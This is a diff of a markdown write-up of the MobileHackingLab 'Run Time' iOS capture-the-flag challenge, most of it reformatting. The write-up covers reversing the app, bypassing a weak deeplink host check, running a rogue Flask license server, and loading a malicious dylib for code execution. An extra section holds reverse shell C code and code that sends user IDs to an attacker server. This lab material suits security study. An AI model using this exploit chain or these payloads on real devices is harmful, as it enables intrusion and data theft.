@@ -1,7 +1,4 @@
-Title: MobileHackingLab - Run Time
-Slug: mobile/mobilehackinglab/runtime
-Date: 2026-05-24 12:00
-Category: Mobile
+# MobileHackingLab - Run Time
 
 This is an iOS mobile challenge from [MobileHackingLabs](https://www.mobilehackinglab.com/course/lab-runtime)
 
@@ -11,16 +8,16 @@ This challenge focuses on a fictitious app called Run Time, which is a fitness a
 
 When opening the application, the user is asked to login or signup:
 
-![[runtime-mobile-1.jpg]]
+![runtime-mobile-1](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-1.jpg)
 
 
 When trying to signup, the keyboard is a little buggy, not allowing to tap on the "Create Local Account" button:
 
-![[runtime-mobile-2.jpg]]
+![runtime-mobile-2](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-2.jpg)
 
 This is solved by running the following `frida` script as follows:
 
-~~~javascript
+```javascript
 function closeKeyboard(f=null){
     // Collect all Runtime's Controllers
     let controllers = Object.keys(ObjC.classes).filter(x => x.includes('Runtime') && x.includes('Controller'));   
@@ -42,39 +39,39 @@ function closeKeyboard(f=null){
         })
     })
 }
-~~~
+```
 
-![[runtime-frida-1.png]]
+![runtime-frida-1](../../images/mobile/mobilehackinglab/runtime/runtime-frida-1.png)
 
 After invoking the function `closeKeyboard()`, the keyboard gets successfully closed, allowing to complete the signup process:
 
-![[runtime-mobile-3.jpg]]
+![runtime-mobile-3](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-3.jpg)
 
 After logging in, the following screen is presented: 
 
-![[runtime-mobile-4.jpg]]
+![runtime-mobile-4](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-4.jpg)
 
 When clicking on "Pro Pack", the following screen asks to subscribe or start a free trial in order to access pro functionalities:
 
-![[runtime-mobile-5.jpg]]
+![runtime-mobile-5](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-5.jpg)
 
 However, when clicking on both, the following error page claiming that payments are not accepted in my country, is returned:
 
-![[runtime-mobile-6.jpg]]
+![runtime-mobile-6](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-6.jpg)
 
 ## Static & Dynamic Analysis
 
 After reversing the IPA, by analysing the `Info.plist`, I've noticed that it's present a URL Scheme definition for the scheme `runtime`:
 
-![[runtime-static-1.png]]
+![runtime-static-1](../../images/mobile/mobilehackinglab/runtime/runtime-static-1.png)
 
 In the same `Info.plist`, `Runtime.SceneDelegate` is defined as the handler for this URL Scheme:
 
-![[runtime-static-2.png]]
+![runtime-static-2](../../images/mobile/mobilehackinglab/runtime/runtime-static-2.png)
 
 Following the complete `Info.plist`:
 
-~~~
+```
 {
   "BuildMachineOSBuild" => "23G93"
   "CFBundleDevelopmentRegion" => "en"
@@ -151,16 +148,16 @@ Following the complete `Info.plist`:
   ]
 }
 
-~~~
+```
 
 
 After decompiling the app with `Ghidra`, I've found that this URL Scheme is used by the `trialSubscription` method in the class `Runtime.SubscribeController`:
 
-![[runtime-static-3.png]]
+![runtime-static-3](../../images/mobile/mobilehackinglab/runtime/runtime-static-3.png)
 
 Following the complete decompiled code:
 
-~~~c
+```c
 /* Runtime.SubscribeController.trialSubscription() -> () */
 
 void __thiscall Runtime::SubscribeController::trialSubscription(SubscribeController *this)
@@ -290,24 +287,24 @@ void __thiscall Runtime::SubscribeController::trialSubscription(SubscribeControl
 }
 
 
-~~~
+```
 
 I've then opened the same URL using the following command on the iPhone, after connecting with ssh:
 
-~~~shell
+```shell
 uiopen "runtime://starttrial?server=mhl.pages.dev/runtime&trialKey=1234-5678-ABCD"
-~~~
+```
 
 
-![[runtime-deeplink-1.png]]
+![runtime-deeplink-1](../../images/mobile/mobilehackinglab/runtime/runtime-deeplink-1.png)
 
 As result, the following error was received:
 
-![[runtime-mobile-7.jpg]]
+![runtime-mobile-7](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-7.jpg)
 
 By analyzing the reversed code, I've noticed the method `verifyLicense` in class  `Runtime.SubscribeController`, which code is integrally reported below:
 
-~~~c
+```c
 /* Runtime.SubscribeController.verifyLicense(server: Swift.String, key: Swift.String) -> () */
 
 void __thiscall
@@ -749,40 +746,40 @@ Runtime::SubscribeController::verifyLicense(SubscribeController *this,String ser
   return;
 }
 
-~~~
+```
 
 In this code there are some interesting hotspots; lines from 199 to 214 seem to be checking that the value specified for the deeplink's parameter `server` contains the value `mhl.pages.dev`:
 
-![[runtime-static-4.png]]
+![runtime-static-4](../../images/mobile/mobilehackinglab/runtime/runtime-static-4.png)
 
 Then, lines from 216 to 308 check if the action specified in the deeplink is `buypro`; when this is true, the application opens a web view to the url `http://<server value>/payment?license_type=pro`:
 
-![[runtime-static-5.png]]
+![runtime-static-5](../../images/mobile/mobilehackinglab/runtime/runtime-static-5.png)
 
 
 However, this results in the same web page returning the "payments not accepted" error:
 
-![[runtime-mobile-8.jpg]]
+![runtime-mobile-8](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-8.jpg)
 
 Continuing with the code analysis, when the action specified is `starttrial`, firstly, the value specified in the parameter `trialKey` is matched against the regex `^[0-9]{4}-[0-9]{4}-[A-Z]{4}$`:
 
-![[runtime-static-6.png]]
+![runtime-static-6](../../images/mobile/mobilehackinglab/runtime/runtime-static-6.png)
 
 Then an HTTP request is sent to the URL `http://<server value>/health`:
 
-![[runtime-static-7.png]]
+![runtime-static-7](../../images/mobile/mobilehackinglab/runtime/runtime-static-7.png)
 
 Following the request intercepted using `Burpsuite`, specifying `mhl.pages.dev`as `server`value:
 
-![[runtime-intercept-1.png]]
+![runtime-intercept-1](../../images/mobile/mobilehackinglab/runtime/runtime-intercept-1.png)
 
 The HTTP request is actually handled by the following lambda function, which on his turn, invokes the lambda `$$closure_#1_@Sendable_(Foundation.Data?,__C.NSURLResponse?,Swift.Error?)_->_()_in_Runtime.SubscribeController.verifyLicense`:
 
-![[runtime-static-8.png]]
+![runtime-static-8](../../images/mobile/mobilehackinglab/runtime/runtime-static-8.png)
 
 Following the complete lambda code:
 
-~~~c
+```c
 
 void $$closure_#1_@Sendable_(Foundation.Data?,__C.NSURLResponse?,Swift.Error?)_->_()_in_Runtime.SubscribeController.verifyLicense(server:_Swift.String,key:_Swift.String)_->_()
                (double param_1,Data param_2,ulong param_3,long param_4,long param_5,
@@ -1073,39 +1070,39 @@ LAB_1000084b0:
   ___stack_chk_fail();
 }
 
-~~~
+```
 
 At lines 113-123 there's a check for the HTTP response status code, raising a "Malformed response from server" error when the status code is not 200:
 
-![[runtime-static-9.png]]
+![runtime-static-9](../../images/mobile/mobilehackinglab/runtime/runtime-static-9.png)
 
 Even though that's the exact error received when opening the deeplink `runtime://starttrial?server=192.168.1.6:8000/mhl.pages.dev/runtime&trialKey=1234-5678-ABCD`, the intercepted request in the previous `Burpsuite` screenshot clearly shows that this requirement is satisfied (the status code 200 was received). 
 
 Further code analysis revealed that there's a JSON deserialization of the HTTP response body which raises the same error when failed:
 
-![[runtime-static-10.png]]
+![runtime-static-10](../../images/mobile/mobilehackinglab/runtime/runtime-static-10.png)
 
 I've then confirmed that the "malformed response" error isn't received anymore when the response contains an actual valid JSON; I've done this by intercepting and manipulating the response using `Burpsuite`:
 
-![[runtime-intercept-2.png]]
+![runtime-intercept-2](../../images/mobile/mobilehackinglab/runtime/runtime-intercept-2.png)
 
-![[runtime-intercept-3.png]]
+![runtime-intercept-3](../../images/mobile/mobilehackinglab/runtime/runtime-intercept-3.png)
 
 The "malformed response" is then replaced by some new error - "Invalid response from server":
 
-![[runtime-mobile-9.jpg]]
+![runtime-mobile-9](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-9.jpg)
 
 Code analysis showed that the application is expecting the `status` field in the JSON response; when not provided, the previous error is returned: 
 
-![[runtime-static-11.png]]
+![runtime-static-11](../../images/mobile/mobilehackinglab/runtime/runtime-static-11.png)
 
 Moreover, if the value in the `status` field is **not** `healthy`, then the error "Server not healthy" is returned:
 
-![[runtime-static-12.png]]
+![runtime-static-12](../../images/mobile/mobilehackinglab/runtime/runtime-static-12.png)
 
 as shown below:
 
-![[runtime-mobile-10.jpg]]
+![runtime-mobile-10](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-10.jpg)
 
 At this point, instead of continuing manipulating responses using `Burpsuite`, I've built a simple `Flask` application, implementing a `/health` endpoint. 
 
@@ -1113,30 +1110,30 @@ As previously described, the application code (lines 199 to 214) expects the val
 
 - The purpose of this control is to assure that only `mhl.pages.dev` domain or its subdomains can be used as license server. However, the usage of `contains` isn't strong enough and can be easily bypassed  as follows:
 
-~~~shell
+```shell
 uiopen "runtime://starttrial?server=192.168.1.6:8000/mhl.pages.dev/runtime&trialKey=1234-5678-ABCD"
-~~~
+```
 
-![[runtime-deeplink-2.png]]
+![runtime-deeplink-2](../../images/mobile/mobilehackinglab/runtime/runtime-deeplink-2.png)
 
 This value will satisfy the requirements and allow to specify an arbitrary license server.
 
 
 Following the snippet of the `Flask` application implementing the `/health` endpoint:
 
-![[runtime-server-1.png]]
+![runtime-server-1](../../images/mobile/mobilehackinglab/runtime/runtime-server-1.png)
 
 The `Flask`application is then started as follows:
 
-![[runtime-server-2.png]]
+![runtime-server-2](../../images/mobile/mobilehackinglab/runtime/runtime-server-2.png)
 
 By opening the deeplink `runtime://starttrial?server=192.168.1.6:8000/mhl.pages.dev/runtime&trialKey=1234-5678-ABCD`, the "health" step is successfully passed; a new HTTP request to a `/activate` endpoint is sent:
 
-![[runtime-intercept-4.png]]
+![runtime-intercept-4](../../images/mobile/mobilehackinglab/runtime/runtime-intercept-4.png)
 
 This request is sent by the function `activateServer` in class `Runtime.SubscribeController`:
 
-~~~c
+```c
 /* Runtime.SubscribeController.activateServer(server: Swift.String) -> () */
 
 void __thiscall
@@ -1361,18 +1358,18 @@ Runtime::SubscribeController::activateServer(SubscribeController *this,String se
 }
 
 
-~~~
+```
 
 In particular, a POST request is sent to the URL `http://<server value>/activate`
 
-![[runtime-static-13.png]]
+![runtime-static-13](../../images/mobile/mobilehackinglab/runtime/runtime-static-13.png)
 
 Similar to the `/health` request code, the HTTP request is handled by the lambda function `$closure_#1_@Sendable_(Foundation.Data?,__C.NSURLResponse?,Swift.Error?)_->_()_in_Runtime.SubscribeController.activateServer(server:_Swift.String)_->_`:
-![[runtime-static-14.png]]
+![runtime-static-14](../../images/mobile/mobilehackinglab/runtime/runtime-static-14.png)
 
 Following the integral code:
 
-~~~c
+```c
 
 void $$closure_#1_@Sendable_(Foundation.Data?,__C.NSURLResponse?,Swift.Error?)_->_()_in_Runtime.SubscribeController.activateServer(server:_Swift.String)_->_()
                (double param_1,undefined *param_2,ulong param_3,long param_4,long param_5,
@@ -1769,27 +1766,27 @@ LAB_100009650:
                     /* WARNING: Subroutine does not return */
   ___stack_chk_fail();
 }
-~~~
+```
 
 Lines 290 to 323 try to obtain the value from a JSON field named "token"; when this fails, the error "Invalid reponse from server" is returned:
 
-![[runtime-static-15.png]]
+![runtime-static-15](../../images/mobile/mobilehackinglab/runtime/runtime-static-15.png)
 
 Moreover, the provided `token` value is expected to be a valid UUID, returning the error "Invalid token format" otherwise:
 
-![[runtime-static-16.png]]
+![runtime-static-16](../../images/mobile/mobilehackinglab/runtime/runtime-static-16.png)
 
 I've then implemented a new `/activate` endpoint in the `Flask` application which returns a random UUID in the `token` field:
 
-![[runtime-server-3.png]]
+![runtime-server-3](../../images/mobile/mobilehackinglab/runtime/runtime-server-3.png)
 
 After opening the same deeplink again, the application did a request to the endpoint `/download` after successfully checking the status and retrieving the token:
 
-![[runtime-intercept-5.png]]
+![runtime-intercept-5](../../images/mobile/mobilehackinglab/runtime/runtime-intercept-5.png)
 
 This HTTP request is generated by the function `getLicenseFile` in class `Runtime.SubscribeController`:
 
-~~~c
+```c
 /* Runtime.SubscribeController.getLicenseFile(server: Swift.String, withToken: Swift.String) -> ()
     */
 
@@ -2037,21 +2034,21 @@ Runtime::SubscribeController::getLicenseFile
   return;
 }
 
-~~~
+```
 
 In particular, a GET request is sent to the url `http://<server value>/download`:
 
-![[runtime-static-17.png]]
+![runtime-static-17](../../images/mobile/mobilehackinglab/runtime/runtime-static-17.png)
 
 Please note that at line 200, the application sets the request header `X-API-Key` with the token received in the previous request. This is supposed to be used as authentication credential when downloading the license.
 
 Also this time, the HTTP request is handled by a lambda function - `$$closure_#1_@Sendable_(Foundation.Data?,__C.NSURLResponse?,Swift.Error?)_->_()_in_Runtime.SubscribeController.getLicenseFile(server:_Swift.String,withToken:_Swift.String)_->_()`:
 
-![[runtime-static-18.png]]
+![runtime-static-18](../../images/mobile/mobilehackinglab/runtime/runtime-static-18.png)
 
 Following the complete lambda code:
 
-~~~c
+```c
 /* WARNING: Removing unreachable block (ram,0x00010000b108) */
 /* WARNING: Removing unreachable block (ram,0x00010000b370) */
 /* WARNING: Removing unreachable block (ram,0x00010000b020) */
@@ -3140,30 +3137,30 @@ LAB_10000b784:
   return;
 }
 
-~~~
+```
 
 This code expects some binary content to be returned in response with mime type `application/octet-stream`:
 
-![[runtime-static-19.png]]
+![runtime-static-19](../../images/mobile/mobilehackinglab/runtime/runtime-static-19.png)
 
 The response content is then saved into a file named `license.dylib`; before writing the file to disk, the destination directory is created using the `NSFileManager`:
 
-![[runtime-static-20.png]]
+![runtime-static-20](../../images/mobile/mobilehackinglab/runtime/runtime-static-20.png)
 
 Then the file is written to the destination path:
 
-![[runtime-static-21.png]]
+![runtime-static-21](../../images/mobile/mobilehackinglab/runtime/runtime-static-21.png)
 
 Afterwards, the download `dylib` is opened using `_dlopen`:
 
-![[runtime-static-22.png]]
+![runtime-static-22](../../images/mobile/mobilehackinglab/runtime/runtime-static-22.png)
 
 And then the function `register_device` is attempted to be invoked from the loaded `dylib` using the function `_dlsym`:
 
-![[runtime-static-23.png]]
+![runtime-static-23](../../images/mobile/mobilehackinglab/runtime/runtime-static-23.png)
 
 
-![[runtime-static-24.png]]
+![runtime-static-24](../../images/mobile/mobilehackinglab/runtime/runtime-static-24.png)
 
 If the `register_device` function is not found in the loaded `dylib`, the error "Function register_device not found" is raised. Otherwise, if the `register_device` function is correctly invoked and returns the value `1`, the pro subscription gets activated *but sadly the pro features are not implemented yet* - what a shame!
 
@@ -3171,70 +3168,70 @@ If the `register_device` function is not found in the loaded `dylib`, the error 
 
 Having the capability to arbitrarily load dynamic libraries and execute the function `register_device`, i've wrote the following simple C code to test whether it was possibile to achieve code execution:
 
-~~~c
+```c
 #include <stdio.h>
 
 int register_device(void) {
     printf("Hello from dylib!\n");
     return 1;
 }
-~~~
+```
 
 Then I've compiled the code as follows:
 
-~~~
+```
 clang -dynamiclib -o license.dylib License.c 
-~~~
+```
 
-![[runtime-compile-1.png]]
+![runtime-compile-1](../../images/mobile/mobilehackinglab/runtime/runtime-compile-1.png)
 
 And implemented the `/download` endpoint in the `Flask` application:
 
-![[runtime-server-4.png]]
+![runtime-server-4](../../images/mobile/mobilehackinglab/runtime/runtime-server-4.png)
 
 Intercepting the request, I've confirmed that application downloads the `dylib`:
 
-![[runtime-intercept-6.png]]
+![runtime-intercept-6](../../images/mobile/mobilehackinglab/runtime/runtime-intercept-6.png)
 
 And finally... the `dylib` failed to be loaded - *sad*:
 
-![[runtime-mobile-11.jpg]]
+![runtime-mobile-11](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-11.jpg)
 
 This was due to the fact that I didn't compiled the code for iOS but for MacOS, as confirmed by the following command:
 
 
-~~~shell
+```shell
 otool -l license.dylib | grep -A3 LC_BUILD_VERSION
-~~~
+```
 
 
-![[runtime-compile-2.png]]
+![runtime-compile-2](../../images/mobile/mobilehackinglab/runtime/runtime-compile-2.png)
 
 Platform `1` means that the binary is targeting MacOS, whilst it should be `2` for iOS.
 
 In order to cross-compile the binary for iOS, I ran the following command:
 
-~~~shell
+```shell
 clang -arch arm64 -miphoneos-version-min=15.0 -isysroot "$(xcrun --sdk iphoneos --show-sdk-path)" -dynamiclib -install_name @rpath/license.dylib License.c -o license.dylib
-~~~
+```
 
 Moreover, the binary is expected to be signed. Therefore I signed it as follows:
 
-~~~shell
+```shell
 ldid -S license.dylib
-~~~
+```
 
 Then, I confirmed that the target platform is correct:
 
-![[runtime-compile-3.png]]
+![runtime-compile-3](../../images/mobile/mobilehackinglab/runtime/runtime-compile-3.png)
 
 After re-opening the deeplink, the `register_function` was successfully executed and the pro subscription activated!
 
-![[runtime-mobile-12.jpg]]
+![runtime-mobile-12](../../images/mobile/mobilehackinglab/runtime/runtime-mobile-12.jpg)
 
 Following the complete `Flask` application code:
 
-~~~python
+```python
 from flask import Flask, send_from_directory
 import uuid
 import os
@@ -3260,13 +3257,13 @@ def download():
     return send_from_directory(os.path.join(root_dir, "www"), "license.dylib")
 
 
-~~~
+```
 
 ## Extra
 
 After completing the challenge, I've tried opening a reverse shell using the following C code:
 
-~~~c
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -3307,17 +3304,17 @@ int register_device(void) {
     close(sock);
     return 1;
 }
-~~~
+```
 
 However, even though the socket connection was actually established, the `execve` execution was not allowed:
 
-![[runtime-exploit-1.jpg]]
+![runtime-exploit-1](../../images/mobile/mobilehackinglab/runtime/runtime-exploit-1.jpg)
 
 **This is probably due to the fact the that sandbox policy is not disabled by the jailbreak on my iPhone - I need to investigate further.**
 
 However, i still could execute arbitrary C code, such as the following, retrieving current iOS user UID, GID, EUID and EGID and sending via socket to the attacker-controlled server:
 
-~~~c
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -3364,6 +3361,6 @@ int register_device(void) {
     close(sock);
     return 1;
 }
-~~~
+```
 
-![[runtime-exploit-2.jpg]]
+![runtime-exploit-2](../../images/mobile/mobilehackinglab/runtime/runtime-exploit-2.jpg)
